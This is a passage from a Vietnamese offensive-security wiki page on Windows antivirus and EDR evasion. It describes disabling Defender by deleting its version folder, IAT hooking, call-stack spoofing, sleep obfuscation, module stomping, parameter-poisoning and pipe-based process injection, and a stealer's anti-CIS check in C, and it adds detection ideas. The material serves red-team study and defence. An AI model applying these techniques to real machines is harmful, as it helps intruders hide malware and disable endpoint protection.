4) Xác minh MsMpEng.exe (WinDefend) chạy từ đường dẫn được chuyển hướng:
```powershell
Get-Process MsMpEng | Select-Object Id,Path
# or
wmic process where name='MsMpEng.exe' get ProcessId,ExecutablePath
```
Bạn sẽ thấy đường dẫn tiến trình mới bên dưới `C:\TMP\AV\` và cấu hình dịch vụ/registry phản ánh vị trí đó.

Các tùy chọn hậu khai thác
- DLL sideloading/code execution: Thả/thay thế các DLL mà Defender tải từ thư mục ứng dụng của nó để thực thi mã trong các tiến trình của Defender. Xem phần phía trên: [DLL Sideloading & Proxying](#dll-sideloading--proxying).
- Service kill/denial: Xóa version-symlink để khi khởi động lần tiếp theo, đường dẫn đã cấu hình không thể được phân giải và Defender không khởi động được:
```cmd
rmdir "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0"
```

> [!TIP]
> Lưu ý rằng kỹ thuật này tự nó không giúp leo thang đặc quyền; kỹ thuật này yêu cầu quyền admin.

## API/IAT Hooking + Call-Stack Spoofing with PIC (Crystal Kit-style)

Red team có thể chuyển hoạt động né tránh lúc runtime ra khỏi C2 implant và vào chính module mục tiêu bằng cách hook Import Address Table (IAT) của module đó, rồi định tuyến các API được chọn qua mã position-independent (PIC) do kẻ tấn công kiểm soát. Cách này khái quát hóa việc né tránh vượt ra ngoài phạm vi API nhỏ mà nhiều kit cung cấp (ví dụ: CreateProcessA), đồng thời mở rộng các biện pháp bảo vệ tương tự cho BOF và DLL hậu khai thác.<sup>[[3]](#references)[[4]](#references)[[5]](#references)</sup>

Cách tiếp cận tổng quan
- Stage một PIC blob cùng với module mục tiêu bằng reflective loader (được thêm vào trước hoặc đi kèm). PIC phải tự chứa và position-independent.
- Khi host DLL được tải, duyệt IMAGE_IMPORT_DESCRIPTOR của nó và vá các mục IAT tương ứng với những import được nhắm mục tiêu (ví dụ: CreateProcessA/W, CreateThread, LoadLibraryA/W, VirtualAlloc) để trỏ đến các PIC wrapper mỏng.
- Mỗi PIC wrapper thực hiện các biện pháp né tránh trước khi tail-call đến địa chỉ API thực. Các biện pháp né tránh thường dùng gồm:
  - Mask/unmask bộ nhớ quanh lời gọi (ví dụ: mã hóa các vùng beacon, chuyển RWX→RX, thay đổi tên/quyền của page), rồi khôi phục sau lời gọi.
  - Call-stack spoofing: dựng một stack trông hợp lệ rồi chuyển sang API mục tiêu để phân tích call stack cho ra các frame như mong đợi.<sup>[[9]](#references)</sup>
- Để tương thích, hãy export một interface để script Aggressor (hoặc công cụ tương đương) có thể đăng ký các API cần hook cho Beacon, BOF và DLL hậu khai thác.

Vì sao dùng IAT hooking ở đây
- Hoạt động với mọi mã sử dụng import đã hook, không cần sửa mã công cụ hoặc phụ thuộc vào Beacon để proxy các API cụ thể.
- Bao phủ DLL hậu khai thác: hook LoadLibrary* cho phép chặn việc tải module (ví dụ: System.Management.Automation.dll, clr.dll) và áp dụng cùng biện pháp masking/né tránh stack cho các lời gọi API của chúng.
- Khôi phục khả năng sử dụng đáng tin cậy các lệnh hậu khai thác tạo process trước những cơ chế phát hiện dựa trên call stack bằng cách bọc CreateProcessA/W.

Phác thảo IAT hook tối thiểu (mã giả x64 C/C++)
```c
// For each IMAGE_IMPORT_DESCRIPTOR
//  For each thunk in the IAT
//    if imported function == "CreateProcessA"
//       WriteProcessMemory(local): IAT[idx] = (ULONG_PTR)Pic_CreateProcessA_Wrapper;
// Wrapper performs: mask(); stack_spoof_call(real_CreateProcessA, args...); unmask();
```
Ghi chú
- Áp dụng bản vá sau relocations/ASLR và trước lần đầu sử dụng import. Reflective loader như TitanLdr/AceLdr minh họa việc hook trong DllMain của module đã được nạp.
- Giữ wrapper thật nhỏ và an toàn với PIC; phân giải API thực qua giá trị IAT gốc đã lưu trước khi vá hoặc qua LdrGetProcedureAddress.
- Dùng chuyển đổi RW → RX cho PIC và tránh để lại các trang vừa ghi được vừa thực thi được.

Stub giả mạo call-stack
- Stub PIC kiểu Draugr tạo chuỗi lời gọi giả (địa chỉ trả về trỏ vào các module lành tính), rồi chuyển sang API thực.
- Cách này đánh lừa các cơ chế phát hiện kỳ vọng stack chuẩn từ Beacon/BOFs khi gọi API nhạy cảm.
- Kết hợp với kỹ thuật cắt stack/nối stack để đưa luồng vào các frame mong đợi trước prologue của API.

Tích hợp vận hành
- Đặt reflective loader lên trước các DLL post-ex để PIC và hook tự khởi tạo khi DLL được nạp.
- Dùng script Aggressor để đăng ký các API mục tiêu, giúp Beacon và BOFs được hưởng cùng đường né tránh một cách trong suốt, không cần sửa code.

Các cân nhắc về phát hiện/DFIR
- Tính toàn vẹn IAT: các entry phân giải đến địa chỉ không thuộc image (heap/anon); xác minh định kỳ các con trỏ import.
- Bất thường stack: địa chỉ trả về không thuộc image đã nạp; chuyển đột ngột sang PIC không thuộc image; quan hệ tổ tiên RtlUserThreadStart không nhất quán.
- Telemetry của loader: ghi vào IAT trong tiến trình; hoạt động sớm trong DllMain làm thay đổi import thunk; tạo các vùng RX bất thường khi nạp.
- Né tránh image-load: nếu hook LoadLibrary*, hãy theo dõi các lần nạp đáng ngờ của assembly automation/clr có tương quan với sự kiện che giấu bộ nhớ.

Các khối xây dựng và ví dụ liên quan
- Reflective loader thực hiện vá IAT trong lúc nạp (ví dụ: TitanLdr, AceLdr)
- Hook che giấu bộ nhớ (ví dụ: simplehook) và PIC cắt stack (stackcutting)
- Stub PIC giả mạo call-stack (ví dụ: Draugr)


## Import-Time IAT Hooking + Sleep Obfuscation (Crystal Palace/PICO)

### Hook IAT lúc import thông qua PICO thường trú

Nếu kiểm soát reflective loader, bạn có thể hook import **trong lúc** `ProcessImports()` bằng cách thay con trỏ `GetProcAddress` của loader bằng một resolver tùy chỉnh, kiểm tra hook trước:<sup>[[6]](#references)[[7]](#references)[[8]](#references)</sup>

- Tạo một **PICO thường trú** (đối tượng PIC bền vững) tiếp tục tồn tại sau khi loader PIC tạm thời tự giải phóng.
- Export hàm `setup_hooks()` để ghi đè import resolver của loader (ví dụ: `funcs.GetProcAddress = _GetProcAddress`).
- Trong `_GetProcAddress`, bỏ qua import theo ordinal và dùng tra cứu hook dựa trên hash như `__resolve_hook(ror13hash(name))`. Nếu có hook, trả về hook đó; nếu không, chuyển tiếp đến `GetProcAddress` thực.
- Đăng ký các mục tiêu hook khi link bằng các entry Crystal Palace `addhook "MODULE$Func" "hook"`. Hook vẫn hợp lệ vì nó nằm bên trong PICO thường trú.

Cách này tạo **định tuyến lại IAT lúc import** mà không cần vá section code của DLL đã nạp sau khi nạp xong.

### Buộc tạo import có thể hook khi mục tiêu dùng PEB-walking

Hook lúc import chỉ được kích hoạt nếu hàm thực sự có trong IAT của mục tiêu. Nếu một module phân giải API bằng PEB-walk + hash (không có import entry), hãy buộc tạo một import thực để đường xử lý `ProcessImports()` của loader nhận diện được:

- Thay việc phân giải export theo hash (ví dụ: `GetSymbolAddress(..., HASH_FUNC_WAIT_FOR_SINGLE_OBJECT)`) bằng tham chiếu trực tiếp như `&WaitForSingleObject`.
- Trình biên dịch sẽ tạo một entry IAT, cho phép chặn khi reflective loader phân giải import.

### Che giấu khi ngủ/chờ kiểu Ekko mà không vá `Sleep()`

Thay vì vá `Sleep`, hãy hook các primitive chờ/IPC thực tế mà implant sử dụng (`WaitForSingleObject(Ex)`, `WaitForMultipleObjects`, `ConnectNamedPipe`). Với các lần chờ dài, bọc lời gọi trong chuỗi obfuscation kiểu Ekko để mã hóa image trong bộ nhớ khi nhàn rỗi:<sup>[[31]](#references)[[27]](#references)</sup>

- Dùng `CreateTimerQueueTimer` để lên lịch một chuỗi callback gọi `NtContinue` với các frame `CONTEXT` được tạo sẵn.
- Chuỗi điển hình (x64): đặt image thành `PAGE_READWRITE` → mã hóa RC4 bằng `advapi32!SystemFunction032` trên toàn bộ image đã map → thực hiện thao tác chờ blocking → giải mã RC4 → **khôi phục quyền theo từng section** bằng cách duyệt các section PE → báo hiệu hoàn tất.
- `RtlCaptureContext` cung cấp một `CONTEXT` mẫu; sao chép nó thành nhiều frame và đặt các thanh ghi (`Rip/Rcx/Rdx/R8/R9`) để gọi từng bước.

Chi tiết vận hành: trả về “success” cho các lần chờ dài (ví dụ: `WAIT_OBJECT_0`) để caller tiếp tục trong khi image đang được che. Mẫu này ẩn module khỏi scanner trong các khoảng nhàn rỗi và tránh dấu hiệu đặc trưng của việc “vá `Sleep()`”.

Ý tưởng phát hiện (dựa trên telemetry)
- Các đợt callback `CreateTimerQueueTimer` có đích trỏ đến `NtContinue`.
- `advapi32!SystemFunction032` được dùng trên các buffer liên tục lớn cỡ image.
- `VirtualProtect` trên vùng lớn, sau đó khôi phục quyền tùy chỉnh theo từng section.

### Đăng ký CFG lúc runtime cho các gadget sleep-obfuscation

Trên các mục tiêu bật CFG, lần nhảy gián tiếp đầu tiên vào gadget giữa hàm như `jmp [rbx]` hoặc `jmp rdi` thường làm tiến trình crash với `STATUS_STACK_BUFFER_OVERRUN`, vì gadget không có trong metadata CFG của module. Để duy trì các chuỗi kiểu Ekko/Kraken trong tiến trình được harden:<sup>[[30]](#references)</sup>

- Đăng ký mọi đích gián tiếp mà chuỗi sử dụng bằng `NtSetInformationVirtualMemory(..., VmCfgCallTargetInformation, ...)` và các entry `CFG_CALL_TARGET_VALID`.
- Với địa chỉ bên trong image đã nạp (`ntdll`, `kernel32`, `advapi32`), `MEMORY_RANGE_ENTRY` phải bắt đầu tại **image base** và bao phủ **toàn bộ kích thước image**.
- Với vùng được map thủ công/PIC/stomp, thay vào đó hãy dùng **allocation base** và kích thước allocation.
- Đánh dấu không chỉ dispatch gadget mà cả các export được gọi gián tiếp (`NtContinue`, `SystemFunction032`, `VirtualProtect`, `GetThreadContext`, `SetThreadContext`, các wait/event syscall) và mọi section thực thi do attacker kiểm soát sẽ trở thành đích gián tiếp.

Cách này biến các chuỗi sleep kiểu ROP/JOP từ “chỉ hoạt động trong tiến trình không có CFG” thành primitive có thể tái sử dụng cho `explorer.exe`, trình duyệt, `svchost.exe` và các endpoint khác được biên dịch với `/guard:cf`.

### Giả mạo stack an toàn với CET cho các thread đang ngủ

Thay thế toàn bộ `CONTEXT` dễ gây chú ý và có thể lỗi trên hệ thống CET Shadow Stack vì `Rip` giả mạo vẫn phải khớp với shadow stack phần cứng. Mẫu che giấu khi ngủ an toàn hơn là:<sup>[[30]](#references)</sup>

- Chọn một thread khác trong cùng tiến trình và đọc giới hạn stack `NT_TIB` / TEB của nó (`StackBase`, `StackLimit`) qua `NtQueryInformationThread`.
- Sao lưu TEB/TIB thật của thread hiện tại.
- Chụp context thật của thread đang ngủ bằng `GetThreadContext`.
- Chỉ sao chép `Rip` thật vào context giả mạo, giữ nguyên `Rsp`/trạng thái stack đã giả mạo.
- Trong khoảng thời gian ngủ, sao chép `NT_TIB` của thread giả mạo vào TEB hiện tại để stack walker unwind bên trong một vùng stack hợp lệ.
- Sau khi thao tác chờ kết thúc, khôi phục TIB và thread context ban đầu.

Cách này giữ instruction pointer nhất quán với CET, đồng thời đánh lừa stack walker của EDR vốn tin metadata stack trong TEB để xác thực quá trình unwind.

### Phương án thay thế dùng APC: Kraken Mask

Nếu dispatch qua timer-queue quá dễ bị nhận diện, có thể thực hiện cùng chuỗi ngủ-mã hóa-giả mạo-khôi phục từ một helper thread đang bị suspend, dùng APC đã xếp hàng:<sup>[[27]](#references)</sup>

- Tạo helper thread với `NtTestAlert` làm entrypoint.
- Xếp hàng các frame `CONTEXT`/APC đã chuẩn bị bằng `NtQueueApcThread` và xử lý chúng bằng `NtAlertResumeThread`.
- Lưu trạng thái chuỗi trên heap thay vì stack của helper để tránh làm cạn stack mặc định 64 KB của thread.
- Dùng `NtSignalAndWaitForSingleObject` để báo hiệu event bắt đầu và chặn nguyên tử.
- Suspend main thread trước khi khôi phục TIB/context (`NtSuspendThread` → khôi phục → `NtResumeThread`) để giảm khoảng thời gian race mà scanner có thể bắt gặp stack mới chỉ được khôi phục một phần.

Cách này thay dấu hiệu `CreateTimerQueueTimer` + `NtContinue` bằng dấu hiệu helper-thread/APC, đồng thời giữ nguyên mục tiêu che bằng RC4 và giả mạo stack.

Ý tưởng phát hiện bổ sung
- `NtSetInformationVirtualMemory` với `VmCfgCallTargetInformation` ngay trước khi ngủ, chờ hoặc dispatch APC.
- `GetThreadContext`/`SetThreadContext` được gọi quanh `WaitForSingleObject(Ex)`, `NtWaitForSingleObject`, `NtSignalAndWaitForSingleObject` hoặc `ConnectNamedPipe`.
- `NtQueryInformationThread` theo sau bởi các lần ghi trực tiếp vào giới hạn stack TEB/TIB của thread hiện tại.
- Chuỗi `NtQueueApcThread`/`NtAlertResumeThread` gián tiếp gọi `SystemFunction032`, `VirtualProtect` hoặc các helper khôi phục quyền section.
- Lặp lại các chữ ký gadget ngắn như `FF 23` (`jmp [rbx]`) hoặc `FF E7` (`jmp rdi`) làm pivot dispatch bên trong module đã ký.


## Precision Module Stomping

Module stomping thực thi payload từ **section `.text` của một DLL đã được map bên trong tiến trình mục tiêu** thay vì cấp phát bộ nhớ thực thi riêng dễ nhận diện hoặc nạp một DLL hy sinh mới. Mục tiêu ghi đè nên là một **image đã nạp và được hỗ trợ bởi file trên đĩa**, có vùng code đủ để chứa payload mà không làm hỏng các đường thực thi mà tiến trình vẫn cần.<sup>[[1]](#references)[[2]](#references)</sup>

### Chọn mục tiêu đáng tin cậy

Stomping ngây thơ vào các module phổ biến như `uxtheme.dll` hoặc `comctl32.dll` rất mong manh: DLL có thể chưa được nạp trong tiến trình từ xa, còn vùng code quá nhỏ có thể làm tiến trình crash. Quy trình đáng tin cậy hơn:

1. Liệt kê các module của tiến trình mục tiêu và giữ danh sách include **chỉ gồm tên** các DLL đã được nạp.
2. Build payload trước và ghi lại **kích thước chính xác theo byte**.
3. Quét các DLL ứng viên trên đĩa và so sánh **`.text` `Misc_VirtualSize`** của section PE với kích thước payload. Thông số này quan trọng hơn kích thước file vì nó phản ánh kích thước của section thực thi **khi được map vào bộ nhớ**.
4. Parse **Export Address Table (EAT)** và chọn RVA của một hàm export làm offset bắt đầu stomp.
5. Tính **phạm vi ảnh hưởng**: nếu payload vượt quá ranh giới của hàm được chọn, nó sẽ ghi đè các export liền kề được bố trí phía sau trong bộ nhớ.

Các helper recon/chọn mục tiêu thường thấy ngoài thực tế:

```cmd
list-process-dlls.exe -p <PID> -n -o c:\payloads\modules.txt
python find-stompable-dlls.py -d c:\Windows\System32 -i c:\payloads\modules.txt <payload_size>
python dump-exports.py -f <dll_path>
python blast-radius.py -f <dll_path> -fnc <export_name> -s <payload_size>
```

Ghi chú vận hành
- Ưu tiên các DLL **đã được tải** trong tiến trình từ xa để tránh telemetry do `LoadLibrary`/tải image bất ngờ tạo ra.
- Ưu tiên các export mà ứng dụng đích hiếm khi thực thi; nếu không, các luồng thực thi thông thường có thể chạm vào những byte đã bị stomp trước hoặc sau khi tạo thread.
- Implant lớn thường cần đổi cách nhúng shellcode từ string literal sang **byte-array/braced initializer** để toàn bộ buffer được biểu diễn chính xác trong mã nguồn injector.

Ý tưởng phát hiện
- Ghi từ xa vào các trang thực thi được ánh xạ từ image (`MEM_IMAGE`, `PAGE_EXECUTE*`) thay vì các vùng cấp phát RWX/RX riêng tư phổ biến hơn.
- Các entry point của export có byte trong bộ nhớ không còn khớp với file backing trên đĩa.
- Thread từ xa hoặc các lần chuyển hướng context bắt đầu thực thi bên trong một export DLL hợp lệ có những byte đầu vừa bị sửa đổi.
- Các chuỗi `VirtualProtect(Ex)` / `WriteProcessMemory` đáng ngờ nhắm vào các trang `.text` của DLL, sau đó là tạo thread.

## Process Parameter Poisoning (P3)

Process Parameter Poisoning (P3) là một kỹ thuật **process-injection / EDR-evasion** tránh đường ghi từ xa kinh điển (`VirtualAllocEx` + `WriteProcessMemory`). Thay vì sao chép byte vào một tiến trình đích đang chạy, kỹ thuật này lợi dụng việc Windows **sao chép các tham số khởi động được chọn của `CreateProcessW` vào tiến trình con** và lưu chúng bên trong `PEB->ProcessParameters` (`RTL_USER_PROCESS_PARAMETERS`).<sup>[[28]](#references)[[29]](#references)</sup>

### Các carrier có thể bị đầu độc được `CreateProcessW` sao chép

Các carrier hữu ích gồm:

- `lpCommandLine` → `RTL_USER_PROCESS_PARAMETERS.CommandLine`
- `lpEnvironment` (với `CREATE_UNICODE_ENVIRONMENT`) → `RTL_USER_PROCESS_PARAMETERS.Environment`
- `STARTUPINFO.lpReserved` → `RTL_USER_PROCESS_PARAMETERS.ShellInfo`

Các giới hạn thực tế của carrier:

- `lpCommandLine` phải trỏ đến **bộ nhớ có thể ghi** để `CreateProcessW` sử dụng và bị giới hạn tối đa **32,767 ký tự Unicode**, tính cả ký tự null kết thúc.
- `lpEnvironment` phải là một khối môi trường Unicode gồm các chuỗi `NAME=VALUE\0` liên tiếp, kết thúc bằng một `\0` bổ sung.
- `lpReserved` chính thức được dành riêng, vì vậy ánh xạ `ShellInfo` nên được xem là chi tiết triển khai chứ không phải một hợp đồng ổn định được tài liệu hóa.

Cách này biến việc tạo tiến trình thông thường thành **primitive truyền payload**. Operator tạo tiến trình con với dữ liệu khởi động do attacker kiểm soát và để Windows thực hiện việc sao chép liên tiến trình.

### Luồng tra cứu từ xa không dùng API ghi từ xa

Sau khi tiến trình con được tạo, hãy tìm buffer đã sao chép bằng các primitive **chỉ đọc**:

1. `NtQueryInformationProcess(ProcessBasicInformation)` → lấy `PROCESS_BASIC_INFORMATION.PebBaseAddress`
2. Đọc `PEB` từ xa
3. Theo `PEB.ProcessParameters`
4. Đọc `RTL_USER_PROCESS_PARAMETERS`
5. Dùng con trỏ đã chọn:
   - `parameters.CommandLine.Buffer`
   - `parameters.Environment`
   - `parameters.ShellInfo.Buffer`

Luồng tối thiểu:

```c
NtQueryInformationProcess(hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), &retLen);
NtReadVirtualMemoryEx(hProcess, pbi.PebBaseAddress, &peb, sizeof(peb), &bytesRead, 0);
NtReadVirtualMemoryEx(hProcess, peb.ProcessParameters, &params, sizeof(params), &bytesRead, 0);
// params.CommandLine.Buffer / params.Environment / params.ShellInfo.Buffer
```

### Thực thi vùng đệm tham số đã sao chép

Vùng tham số đã sao chép thường có quyền `RW`, không thể thực thi. Một P3 chain phổ biến gồm:

1. Tạo tiến trình bình thường (không ở trạng thái tạm dừng)
2. Cho phép trang tham số được chọn thực thi bằng `NtProtectVirtualMemory` / `VirtualProtectEx`
3. Tái sử dụng handle của main thread đã được trả về trong `PROCESS_INFORMATION`
4. Chuyển hướng thực thi bằng `NtSetContextThread` (`CONTEXT_CONTROL`, ghi đè `RIP`)

Không giống các quy trình thread hijacking cổ điển, cách này **không yêu cầu** `SuspendThread` / `ResumeThread`; có thể thay đổi context trực tiếp trên handle của main thread được trả về.

Cách này tránh một số API thường bị theo dõi để phát hiện injection:

- `VirtualAllocEx` / `NtAllocateVirtualMemory(Ex)`
- `WriteProcessMemory` / `NtWriteVirtualMemory`
- `CreateRemoteThread` / `NtCreateThreadEx`
- thường cả `SuspendThread` / `ResumeThread`

### Giới hạn byte null và shellcode theo giai đoạn

Cả ba carrier đều là **dữ liệu dạng chuỗi hoặc tương tự chuỗi**, nên payload thô có chứa `0x00` sẽ bị cắt cụt trong quá trình truyền. Một cách khắc phục thiết thực là dùng **first stage không chứa byte null** để tái tạo các hằng số khi chạy, sau đó nạp một second stage bất kỳ.

Một mẫu đơn giản là tổng hợp hằng số dựa trên XOR:

```asm
mov rax, XOR_A
mov r15, XOR_B
xor rax, r15 ; result = desired value, without embedding 0x00 bytes
```

Điều này cho phép stage đầu tiên tạo chuỗi trên stack, đối số API, đường dẫn DLL hoặc bộ nạp shellcode stage thứ hai mà không nhúng byte null vào tham số được truyền.

### Các lời gọi API dựa trên stack từ stage đầu tiên

Khi stage đầu tiên cần gọi các API như `LoadLibraryA`, nó có thể:

- đẩy chuỗi/buffer lên stack của tiến trình đích
- dành **32 byte shadow space x64**
- đặt `RCX`, `RDX`, `R8`, `R9` thành hằng số hoặc con trỏ tương đối với `RSP`
- giữ `RSP` **căn chỉnh 16 byte** trước khi gọi

Sau đó, có thể sao chép stage thứ hai từ stack vào vùng cấp phát `PAGE_READWRITE`, đổi quyền thành `PAGE_EXECUTE_READ` bằng `VirtualProtect` rồi nhảy đến đó, tránh cấp phát RWX trực tiếp.

### Ý tưởng phát hiện

Các cơ hội săn tìm đáng chú ý mà tác giả đề cập:

- `VirtualProtectEx` / `NtProtectVirtualMemory` chuyển các trang tham số tiến trình thành trang có quyền thực thi
- thay đổi quyền bảo vệ đó, tiếp theo là `SetThreadContext` / `NtSetContextThread`
- đọc từ xa `PEB`, sau đó là `RTL_USER_PROCESS_PARAMETERS`
- các giá trị `lpCommandLine`, `lpEnvironment` hoặc `STARTUPINFO.lpReserved` dài bất thường / có entropy cao trong lúc tạo tiến trình

### Ghi chú

- P3 là một **thủ thuật truyền dữ liệu giữa các tiến trình**, bản thân nó không phải primitive thực thi hoàn chỉnh: tham số được sao chép vẫn cần được đổi quyền để thực thi và cần có phương thức chuyển hướng thực thi.
- Các tác giả đã cân nhắc `RtlCreateProcessReflection` / Dirty Vanity nhưng bác bỏ vì bên trong chúng sử dụng các primitive đáng ngờ như `NtWriteVirtualMemory` và `NtCreateThreadEx`.

Để chuyển payload vào một tiến trình Windows **đang tồn tại** thông qua mô tả luồng, sau đó chiếm quyền địa chỉ trả về của luồng đang chờ, xem [Thread Name-Calling and Waiting Thread Hijacking](windows-process-injection-thread-name-calling-waiting-thread-hijacking.md).

## Tiêm mã qua pipe STDIN của console

Một tiến trình con console tương tác cũng có thể được dùng làm **primitive truyền payload**. Injector chuyển hướng đầu vào chuẩn của tiến trình con đến một pipe rồi gửi marker kèm shellcode. Sau khi chương trình console đọc dữ liệu vào vùng nhớ riêng của nó, injector tìm buffer đó, cấp quyền thực thi cho vùng nhớ và chuyển hướng một luồng của tiến trình con đến đó. Cách này tránh `VirtualAllocEx` và `WriteProcessMemory`, nhưng vẫn là tiêm tiến trình chứ không phải một EDR bypass tổng quát.<sup>[[41]](#references)</sup>

Dù được mô tả là "named-pipe", implementation tham chiếu gọi `CreatePipe`, hàm này tạo một **anonymous pipe**. Windows triển khai anonymous pipe bằng các đối tượng pipe có tên duy nhất ở bên trong, nhưng PoC không chọn đường dẫn `\\.\pipe\<name>` và cũng không gọi `CreateNamedPipe`. Nó tạo các handle có thể kế thừa với security descriptor mặc định, đặt handle đọc vào `STARTUPINFO.hStdInput`, đặt `STARTF_USESTDHANDLES` rồi khởi chạy một tiến trình con mới với tính năng kế thừa handle được bật. Do đó, PoC khởi chạy tệp thực thi console được cung cấp; nó không gắn pipe vào một tiến trình đang tồn tại.<sup>[[41]](#references)[[42]](#references)[[43]](#references)</sup>

### Quy trình tham chiếu

Implementation sử dụng chuỗi bước sau:<sup>[[41]](#references)</sup>

1. Tạo các cặp anonymous pipe cho `STDIN` và `STDOUT` của tiến trình con. Tắt tính năng kế thừa trên hai handle phía tiến trình cha và đóng các bản sao phía tiến trình con trong tiến trình cha sau khi tạo tiến trình.
2. Khởi chạy một tệp thực thi tương tác như `netsh.exe` hoặc `nslookup.exe` với `CREATE_NEW_CONSOLE`. Tiến trình con kế thừa các handle chuẩn đã được chuyển hướng.
3. Gửi toàn bộ mảng nhị phân `rawData` bằng `WriteFile` qua handle `STDIN` phía tiến trình cha. Chương trình console đọc các byte này và để lại một bản sao trong một trong các vùng đã commit riêng của nó.
4. Duyệt không gian địa chỉ của tiến trình con bằng `VirtualQueryEx`, đọc các vùng `MEM_PRIVATE` ứng viên bằng `ReadProcessMemory` và tìm marker ở đầu `rawData`.
5. Đổi quyền của buffer được tìm thấy thành `PAGE_EXECUTE_READWRITE` bằng `VirtualProtectEx`.
6. Xác định luồng chính, tạm ngưng luồng đó, đặt `RIP` thành `found_address + 0x19` bằng `NtSetContextThread`, rồi tiếp tục luồng.

```powershell
InjectSetConsole.exe C:\Windows\System32\netsh.exe
```

Triển khai được cung cấp chỉ dành cho x64: nó sửa đổi `CONTEXT.Rip`, còn payload nhúng là shellcode x64. `rawData` bắt đầu bằng một marker dài 25 byte, nên các byte thực thi bắt đầu tại offset hexadecimal `0x19`. Khi thay payload, hãy giữ nguyên bố cục đó hoặc cập nhật đồng bộ marker, search vector, kích thước mảng và offset thực thi. Các chú thích trong mã nguồn cũng liệt kê `0x0A`, `0x0D` và `0x1A` là bad character. Workflow này không thay đổi token hoặc đặc quyền của tiến trình con.<sup>[[41]](#references)</sup>

Để xem các helper native nhỏ và mẫu biên dịch payload, hãy tham khảo [Windows C Payloads](windows-local-privilege-escalation/windows-c-payloads.md).

## DLL injection qua thread-pool callback không cần shellcode (DLLParty)

DLLParty điều chỉnh kỹ thuật thread-pool injection kiểu PoolParty để khiến một worker hiện có trong target gọi `LoadLibraryA`, thay vì thực thi một callback stub được inject. Primitive dispatch của nó là một completion `TP_DIRECT` được đưa vào I/O completion port của pool trong target. Cách này không vượt qua quyền truy cập tiến trình: PoC gọi `OpenProcess(PROCESS_ALL_ACCESS)` và cần quyền đọc/ghi bộ nhớ target cũng như các handle worker-factory và completion-port có thể duplicate.<sup>[[46]](#references)[[47]](#references)</sup>

Trên Windows x64, worker truyền một con trỏ tới `TP_CALLBACK_INSTANCE` nằm trên stack vào `RCX`, tức tham số callback đầu tiên. `LoadLibraryA` diễn giải chính con trỏ đó như một `LPCSTR`. Trên đường thực thi đã thử nghiệm, `TppWorkerThread` tạo con trỏ tại `RSP+0x178`, trong khi thao tác ghi thông thường đầu tiên vào đối tượng này diễn ra tại `RSP+0x1d0`. Vì vậy, một DLL path kết thúc bằng null và vừa trong phần đầu dài 0x58 byte có thể nằm ở đầu instance mà không bị ghi đè trước khi dispatch. Đây là quan sát chỉ áp dụng cho một build cụ thể, không phải bảo đảm ABI Windows được tài liệu hóa.<sup>[[46]](#references)[[47]](#references)</sup>

Workflow tham khảo như sau:<sup>[[46]](#references)[[47]](#references)</sup>

1. Liệt kê các handle của target bằng `NtQuerySystemInformation(SystemHandleInformation)` và xác định `TpWorkerFactory` bằng cách truy vấn các loại đối tượng. Duplicate một handle worker-factory và truy vấn `WorkerFactoryBasicInformation`; `StartParameter` cung cấp `TP_POOL` ở xa. Bỏ qua các factory có `TotalWorkerCount == 0`.
2. Đọc `TP_POOL.CompletionPort` và duyệt danh sách worker nội bộ của pool. Trên build Windows 10 19045 x64 đã thử nghiệm (`ntdll.dll 10.0.19041.4842`), head nằm tại `pool+0x60`; mỗi link nằm tại `worker+0x10`, nên slot callback-instance tại `worker+0x38` bằng `link+0x28`. PoC kiểm tra căn chỉnh con trỏ, tính đối ứng của các link, quyền sở hữu pool, thread ID khác 0, node lặp lại và head danh sách ổn định.
3. Ghi DLL path vào **mọi** slot worker tìm được vì bất kỳ worker nào cũng có thể nhận completion đang chờ. Đặt một `TP_DIRECT` có `Callback = LoadLibraryA` trong vùng nhớ ghi được của target. PoC dùng `last_slot-0x500` trên stack của worker thay vì `VirtualAllocEx`; offset này mang tính thử nghiệm và không được đè lên dữ liệu stack đang hoạt động.
4. Duplicate handle completion-port của target và gọi `ZwSetIoCompletion(port, remote_direct, 0, 0, 0)`. Địa chỉ `TP_DIRECT` ở xa là completion key. Một worker hiện có sau đó gọi `LoadLibraryA` với con trỏ callback-instance đã bị ghi đè, nạp một DLL mà target có thể truy cập.

PoC nhận PID của target (`DLLParty.exe <target_pid>`) và dùng một DLL path hard-code trong `DLLParty.cpp`; hãy đặt đường dẫn mà target có thể truy cập trước khi build executable x64. PoC cũng dùng địa chỉ `LoadLibraryA` trong tiến trình của chính nó làm callback ở xa, nên giả định địa chỉ đó hợp lệ trong target. Mã không kiểm tra độ dài path có vượt quá phần đầu 0x58 byte hay không, cũng không kiểm tra việc duyệt worker có tìm được slot nào trước khi truy cập phần tử cuối cùng. Hãy xác minh lại các offset nội bộ, bố cục stack và vùng nhớ có thể ghi cho build target. Việc bỏ `CreateRemoteThreadEx`, shellcode và `VirtualAllocEx` không loại bỏ các thao tác ghi xuyên tiến trình hoặc telemetry nạp DLL.<sup>[[46]](#references)[[47]](#references)</sup>

## Tradecraft của SantaStealer nhằm né tránh không dùng file và đánh cắp thông tin xác thực

SantaStealer (còn gọi là BluelineStealer) cho thấy các info-stealer hiện đại kết hợp AV bypass, anti-analysis và truy cập thông tin xác thực trong cùng một workflow.<sup>[[24]](#references)</sup>

### Kiểm tra layout bàn phím và trì hoãn trong sandbox

- Một cờ cấu hình (`anti_cis`) liệt kê các layout bàn phím đã cài đặt thông qua `GetKeyboardLayoutList`. Nếu phát hiện layout Cyrillic, mẫu tạo một marker `CIS` rỗng rồi kết thúc trước khi chạy các stealer, đảm bảo nó không bao giờ kích hoạt tại các locale bị loại trừ, đồng thời để lại một dấu vết phục vụ hunting.

```c
HKL layouts[64];
int count = GetKeyboardLayoutList(64, layouts);
for (int i = 0; i < count; i++) {
    LANGID lang = PRIMARYLANGID(HIWORD((ULONG_PTR)layouts[i]));
    if (lang == LANG_RUSSIAN) {
        CreateFileA("CIS", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
        ExitProcess(0);
    }
}
Sleep(exec_delay_seconds * 1000); // config-controlled delay to outlive sandboxes
```

### Logic `check_antivm` nhiều lớp

- Biến thể A duyệt danh sách tiến trình, băm từng tên bằng checksum cuộn tùy chỉnh, rồi so sánh với các danh sách chặn được nhúng sẵn dành cho debugger/sandbox; nó lặp lại checksum với tên máy tính và kiểm tra các thư mục làm việc như `C:\analysis`.
